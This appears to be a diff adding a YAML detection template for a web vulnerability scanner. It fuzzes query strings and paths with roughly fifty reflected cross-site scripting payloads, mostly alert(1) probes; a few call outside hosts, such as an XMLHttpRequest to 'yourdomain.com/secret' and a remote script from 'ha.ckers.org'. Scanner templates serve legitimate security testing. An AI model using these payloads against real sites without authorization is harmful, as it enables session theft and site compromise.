@@ -1,0 +1,98 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<script>alert(\"XSS Payload!\")</script>"
+        - "<frame src=\"javascript:alert(1)\">test</frame>"
+        - "<script type=\"text/javascript\">var xhr = new XMLHttpRequest();xhr.open(\"GET\", \"http://yourdomain.com/secret\");xhr.send(null);</script>"
+        - "<IMG SRC=x onerror=\"javascript:alert(1)\">"
+        - "<svg><script src=\"http://ha.ckers.org/xss.js\"></script></svg><img src=x onerror=javascript:alert(1)//>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></video>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></table>\\xss-payload-list"
+        - "<fieldset onbeforepaste=\"alert(1)\" contenteditable>test</fieldset><textarea id=x></textarea><script>x.contentEditable = true;</script><input id=edit>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input type=hidden onbeforedeactivate=alert(2)>"
+        - "<script src=x:\\0x61.js>\\x20alert(1)\\x09</script>\\n"
+        - "<address id=x tabindex=1 onfocusin=alert(1)></address><input autofocus>"
+        - "<template id=x tabindex=1 onbeforeactivate=alert(1)></template>"
+        - "<style>:target {color:red;}</style><plaintext id=x style=\"transition:color 2s\" ontransitionend=alert(1)></plaintext>"
+        - "<select ondblclick=alert(1) tabindex=1 id=x></select><input autofocus>"
+        - "<del id=x tabindex=1 onbeforedeactivate=alert(1)></del>"
+        - "<form onkeypress=\"alert(1)\" contenteditable>test</form>"
+        - "<payloadbox onpaste=\"alert(1)\" contenteditable>test</payloadbox>"
+        - "<frame onload=alert(1) id=x tabindex=1><input autofocus>"
+        - "<policy onkeypress=\"alert(1)\" contenteditable>test</policy><input autofocus>"
+        - "<img src=x onerror=\"alert(1)\">"
+        - "<template draggable=\"true\" ondragenter=\"alert(1)\">test</template>"
+        - "<b id=x tabindex=1></b><input id=y autofocus>"
+        - "<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>"
+        - "<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea><input autofocus>"
+        - "<pre id=x tabindex=1></pre><input autofocus=true onactivate=alert(1)>"
+        - "<form style=\"position:absolute;top:0;left:0;width:100%;height:100%;\" onload=alert(1)></form><input autofocus>"
+        - "<sup onclick=\"alert(1)\">test</sup>"
+        - "<payloadbox"
+        - "<style>:target {transform: rotate(180deg);}</style><script style=\"transition:transform 3s\" :target{transform:rotate(360deg)}</script>"
+        - "<details id=x tabindex=1 onfocusout=alert(1)></details><input autofocus>"
+        - "<html id=\"x\"></html><script>\\x0D<script\\x0Aif(document.getElementById('x').innerHTML){\\x08document.getElementById('x').innerHTML=\\x07alert(1)}"
+        - "<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>"
+        - "<form onkeydown=\"alert(1)\" contenteditable>test</form>"
+        - "<div id=x tabindex=1 onbeforeactivate=alert(1)></div>"
+        - "<style>:target {transform: rotate(180deg);}</style><input id=x style=\"transition:transform 3s\" ontransitionrun=alert(1)>"
+        - "<IMG SRC=x onfocusout=alert(1) autofocus>"
+        - "<pre onkeydown=\"alert(1)\" contenteditable>test</pre>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></noscript>"
+        - "<noscript><img src=x:x onerror=javascript:alert(1)>"
+        - "<template draggable=\"true\" ondragleave=\"alert(1)\">test</template><datalist onfocusoutofrange=\"alert(1)\" contenteditable>test</datalist><track id=x tabindex=1 onbeforeactivate=alert(1)>test</track><textarea id=y onbeforepaste=alert(1)></textarea><input id=z oncut=alert(1)>test</input>"
+        - "<frame onload=\"javascript:alert(1)\">test</frame>"
+        - "<keygen onbeforecopy=\"alert(1)\" contenteditable>test</keygen>"
+        - "<style>:target {color:red;}</style><pre id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></pre>"
+        - "<em draggable=\"true\" ondragstart=\"alert(1)\">test</em>"
+        - "<blockquote id=x tabindex=1 onbeforecopy=\"alert(1)\" contenteditable>test</blockquote>"
+        - "<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>"
+        - "<form action=\"http://example.com/xxe.php\" method=\"post\">
+<script type=\"text/javascript\">alert(1);</script>
+</form>"
+        - "<tt onclick=\"alert(1)\">test</tt>"
+        - "<video src=1 onkeypress=alert(1)></video><input autofocus>"
+        - "<qdraggable id=x tabindex=1 onfocusout=alert(1)></qdraggable>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
